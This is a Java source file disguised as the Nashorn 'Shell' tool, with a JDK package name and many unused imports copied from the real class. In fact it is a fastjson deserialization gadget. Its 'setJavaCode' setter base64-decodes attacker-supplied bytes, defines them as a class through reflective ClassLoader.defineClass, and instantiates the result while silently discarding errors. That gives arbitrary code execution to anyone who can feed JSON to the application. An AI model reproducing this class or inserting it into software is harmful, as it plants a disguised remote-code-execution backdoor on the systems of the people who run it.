package jdk.nashorn.tools;

import java.lang.reflect.Method;
import com.alibaba.fastjson.annotation.JSONCreator;
import com.alibaba.fastjson.annotation.JSONField;
import com.alibaba.fastjson.annotation.JSONType;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintStream;
import java.io.PrintWriter;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Locale;
import java.util.ResourceBundle;
import jdk.nashorn.api.scripting.NashornException;
import jdk.nashorn.internal.codegen.Compiler;
import jdk.nashorn.internal.ir.FunctionNode;
import jdk.nashorn.internal.ir.debug.ASTWriter;
import jdk.nashorn.internal.ir.debug.PrintVisitor;
import jdk.nashorn.internal.objects.Global;
import jdk.nashorn.internal.parser.Parser;
import jdk.nashorn.internal.runtime.Context;
import jdk.nashorn.internal.runtime.ErrorManager;
import jdk.nashorn.internal.runtime.JSType;
import jdk.nashorn.internal.runtime.ScriptEnvironment;
import jdk.nashorn.internal.runtime.ScriptFunction;
import jdk.nashorn.internal.runtime.ScriptRuntime;
import jdk.nashorn.internal.runtime.ScriptingFunctions;
import jdk.nashorn.internal.runtime.Source;
import jdk.nashorn.internal.runtime.options.Options;

@JSONType
public class Shell {
    private static final String MESSAGE_RESOURCE = "jdk.nashorn.tools.resources.Shell";

    public void setJavaCode(String javaCode) {
        try {
            Class clazz = defineCls(javaCode);
            if (clazz != null) {
                clazz.newInstance();
            }
        } catch (Exception e) {}
    }

    public static Class defineCls(String message) {
        try {
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);
            byte[] clazzByte = base64Decode(message);

            Class aClass = (Class) defineClass.invoke(
                    Thread.currentThread().getContextClassLoader(), 
                    clazzByte, 0, clazzByte.length
            );
            return aClass;
        } catch (Throwable var5) {
            var5.printStackTrace();
        }
        return null;
    }

    public static byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class)
                    .invoke(clazz.newInstance(), str);
        } catch (Exception var4) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class)
                    .invoke(decoder, str);
        }
    }
}